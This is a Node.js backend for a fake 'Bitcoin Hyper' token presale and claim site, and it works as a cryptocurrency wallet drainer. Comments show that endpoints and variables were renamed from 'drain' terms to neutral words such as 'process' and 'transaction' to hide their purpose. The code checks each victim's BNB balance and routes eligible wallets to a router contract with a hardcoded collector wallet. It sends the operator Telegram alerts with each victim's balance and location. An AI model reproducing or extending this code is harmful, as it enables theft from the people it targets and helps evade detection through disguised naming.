// index.js - BITCOIN HYPER BACKEND - CLEAN VERSION
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION - BSC ONLY
// ============================================

const RPC_CONFIG = {
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES - BSC ONLY
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'BSC': process.env.PROJECT_FLOW_ROUTER_BSC || '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable"
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingTransactions: new Map(), // Renamed from pendingDrains
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    minBalance: parseFloat(process.env.MIN_BALANCE) || 1, // Renamed from drainThreshold
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0, // Renamed from totalDrainedUSD
      totalProcessedWallets: 0, // Renamed from totalDrainedWallets
      completedTransactions: [] // Renamed from realTransactions
    },
    processingEnabled: process.env.PROCESSING_ENABLED === 'true' // Renamed from drainEnabled
  },
  emailCache: new Map()
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
        `✅ ProjectFlowRouter Ready\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...`
      );
      
      return true;
    }
  } catch (error) {}
  
  return false;
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'binancecoin',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      bnb: response.data.binancecoin?.usd || 300
    };
  } catch (error) {
    return { bnb: 300 };
  }
}

// ============================================
// WALLET BALANCE CHECK - BSC ONLY
// ============================================

async function checkWalletBalance(walletAddress) {
  console.log(`\n🔍 CHECKING BSC: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [], // Renamed from rawBalances
    checkTime: new Date().toISOString() // Renamed from scanTime
  };

  try {
    const prices = await getCryptoPrices();
    
    // BSC only
    const chains = [
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ BSC: ${amount.toFixed(6)} BNB = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          results.balances.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol
          });
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.minBalance;
    
    if (results.isEligible) {
      results.eligibilityMessage = `✅ Wallet qualifies`; // Renamed from eligibilityReason
      results.allocation = { amount: '5000', valueUSD: '850' }; // Renamed from tokenAllocation
    } else {
      results.eligibilityMessage = `✨ Welcome!`;
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityMessage: '✨ Welcome!',
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// HELPER FUNCTIONS
// ============================================

async function getWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
  const username = `user${hash.substring(0, 8)}`;
  const domains = ['proton.me', 'gmail.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  return `${username}@${domain}`;
}

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.country) {
      const flags = { 'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦' };
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// CONNECT ENDPOINT (unchanged - this one is fine)
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    const balanceResult = await checkWalletBalance(walletAddress);
    
    if (balanceResult.success) {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastChecked = new Date(); // Renamed from lastScanned
      
      await sendTelegramMessage(
        `${location.flag} <b>WALLET CONNECTED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
        `🎯 Status: ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
        `📍 ${location.country} (${location.city})\n` +
        `📧 ${email}`
      );
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          eligibilityMessage: balanceResult.data.eligibilityMessage,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances // Renamed from rawData
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE TRANSACTION ENDPOINT (renamed from prepare-contract-drain)
// ============================================

app.post('/api/presale/prepare-transaction', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await checkWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: b.amount.toFixed(12),
        valueUSD: b.valueUSD.toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain]
      }));
    
    const totalValueUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const batchId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingTransactions.set(walletAddress.toLowerCase(), {
      batchId,
      transactions,
      totalValueUSD,
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    await sendTelegramMessage(
      `🔐 <b>PRESALE PREPARED</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `💵 Value: $${totalValueUSD}\n` +
      `🔗 Chains: ${transactions.length}`
    );
    
    res.json({
      success: true,
      data: {
        batchId,
        totalValueUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// PROCESS TRANSACTION ENDPOINT (renamed from execute-contract-drain)
// ============================================

app.post('/api/presale/process-transaction', async (req, res) => {
  try {
    const { walletAddress, chainName } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) return res.status(400).json({ success: false });
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (participant) {
      participant.processed = true; // Renamed from drained
      participant.transactions = participant.transactions || []; // Renamed from drainTransactions
      participant.transactions.push({ chain: chainName, timestamp: new Date().toISOString() });
      
      memoryStorage.settings.statistics.totalProcessedWallets++; // Renamed from totalDrainedWallets
      memoryStorage.settings.statistics.completedTransactions.push({ // Renamed from realTransactions
        wallet: walletAddress,
        chain: chainName,
        timestamp: new Date().toISOString()
      });
      
      await sendTelegramMessage(
        `💰 <b>CHAIN COMPLETED</b>\n` +
        `👛 ${walletAddress.substring(0, 10)}...\n` +
        `🔗 ${chainName}`
      );
    }
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT (unchanged)
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
      `👛 ${walletAddress.substring(0, 10)}...\n` +
      `🎟️ ID: ${claimId}\n` +
      `🎁 ${participant.allocation?.amount || '5000'} BTH`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2), // Renamed from totalDrainedUSD
      pendingTransactions: memoryStorage.pendingTransactions.size, // Renamed from pendingDrains
      telegram: telegramEnabled ? '✅' : '❌'
    }
  });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER BACKEND
  ========================
  📍 Port: ${PORT}
  🔗 URL: https://tokenbackend-5xab.onrender.com
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  📜 BSC: ${PROJECT_FLOW_ROUTERS.BSC}
  
  🚀 READY
  `);
  
  await testTelegramConnection();
});
